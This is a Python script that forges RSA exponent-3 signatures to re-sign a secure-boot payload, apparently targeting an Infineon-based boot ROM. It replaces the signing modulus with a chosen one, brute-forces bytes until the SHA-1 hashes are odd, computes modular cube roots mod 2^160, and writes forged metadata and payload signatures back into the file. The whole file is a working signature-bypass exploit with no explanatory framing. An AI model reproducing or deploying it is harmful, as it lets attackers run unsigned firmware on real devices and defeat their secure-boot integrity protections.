import argparse
import hashlib
import sys


def u32(bin, offset):
	return int.from_bytes(bin[offset : offset + 4], "little")


INFINEON_MODULUS = bytes.fromhex(
	"2705fc370af1835fb2cf7408b143f30b3c3735a70c2a97fa685137ff50d27614"
	"1d1edcfdbe55f3f6943667a5c0fe85295ae7a11038bd88edc1f070a9846fad3a"
	"72e9901f757f82a630ebdcfe2ff2b95e17bf4bf3ba9c0e7a25c9625599847316"
	"b1225fd2fc9bce44b7552dc583d5145326c0188f20e247c1c498ed26df601ff4"
	"62cd299ebc9ccf74136a82e3ef350075d2b49b78cbed10261d1856441bdd6da4"
	"04260beef3a57c955e3cf71da9015b4bc14e54414a02cecec80d710ec72fe0d3"
	"c74403347828cb0ec0ea5d113787d19fe5cee26d5ac1a90646569ca3dd7cf2ae"
	"31fbefed35d03a783f6c93d5f319d3e450f5ebec4e17c7549d32c1b8b832efcb"
)
PAYLOAD_MODULUS = bytes.fromhex(
	"2323232323232323616c756c6123232323232323232323232323232323232323"
	"2323232323232323232323232323232323232323232323232323232323232323"
	"2323232323232323232323232323232323232323232323232323232323232323"
	"2323232323232323232323232323232323232323232323232323232323232323"
	"2323232323232323232323232323232323232323232323232323232323232323"
	"2323232323232323232323232323232323232323232323232323232323232323"
	"2323232323232323232323232323232323232323232323232323232323232323"
	"23232323232323232323232323232323232323232323232323232323232323ff"
)
ROM_METADATA_EXPONENT = 3


def forge_signature(hash: bytes) -> bytes:
	# solves s^3 = hash mod 2^160, returns a forged signature.
	target_int = int.from_bytes(hash, "big")
	if target_int % 2 == 0:
		raise ValueError("target must be odd for modular cube root to exist")
	target_160 = target_int & ((1 << 160) - 1)
	d = pow(3, -1, 1 << 159)
	s = pow(target_160, d, 1 << 160)
	assert (pow(s, 3) & ((1 << 160) - 1)) == target_160
	return int.to_bytes(s, 256, "little")


def make_hash_odd(block: bytearray, offsets, hash_input) -> None:
	for off in offsets:
		orig = block[off]
		for i in range(256):
			block[off] = i
			if hash_input()[-1] % 2 == 1:
				return
		block[off] = orig
	raise ValueError("could not make hash odd")


def main():
	ap = argparse.ArgumentParser()
	ap.add_argument("payload", help="path to payload to resign")

	args = ap.parse_args()

	with open(args.payload, "rb") as f:
		payload = f.read()

	if payload[0x3C:0x40] != b"CJKT":
		print("[!] no CJKT!")
		return 1

	if payload[0x4:0x8] != b"liHU":
		print("[!] no liHU! is it not a secure boot payload?")
		return 1

	signed_size = u32(payload, 0x10)
	metadata_off = u32(payload, 0x14)
	r2_off = u32(payload, 0x20)
	signature_offset = u32(payload, 0x28)

	if signature_offset + 0x100 != signed_size:
		print("[!] sanity check failed: sig_off + 0x100 != secure_signed")
		return 1

	if metadata_off > signed_size - 0x118:
		print("[!] sanity check failed: metadata oob")
		return 1

	metadata_struct = payload[metadata_off : metadata_off + 0x18]
	metadata = bytearray(metadata_struct + PAYLOAD_MODULUS)

	make_hash_odd(metadata, [0, 1, 2, 3], lambda: hashlib.sha1(metadata).digest())

	metadata_hash = hashlib.sha1(metadata).digest()
	forged_meta_signature = forge_signature(metadata_hash)
	print(f"[*] metadata hash: {metadata_hash.hex()}")

	n_flash = bytes(metadata[0x18:0x118])
	n_int = int.from_bytes(n_flash, "little")
	r2 = int.to_bytes(pow(2, 4096, n_int), 256, "little")
	print(f"[*] N_flash bits: {n_int.bit_length()}")

	new_payload = bytearray(payload)
	new_payload[metadata_off : metadata_off + 0x118] = metadata
	new_payload[metadata_off + 0x118 : metadata_off + 0x218] = forged_meta_signature
	new_payload[r2_off : r2_off + 0x100] = r2

	make_hash_odd(
		new_payload,
		[0x24, 0x25, 0x26, 0x27, 0x2C, 0x2D, 0x2E, 0x2F],
		lambda: hashlib.sha1(new_payload[0:signature_offset]).digest(),
	)

	payload_hash = hashlib.sha1(new_payload[0:signature_offset]).digest()
	forged_payload_signature = forge_signature(payload_hash)
	print(f"[*] payload hash: {payload_hash.hex()}")

	new_payload[signature_offset : signature_offset + 0x100] = forged_payload_signature

	with open(args.payload, "wb") as f:
		f.write(new_payload)

	print(f"[*] wrote {args.payload}")


if __name__ == "__main__":
	sys.exit(main())
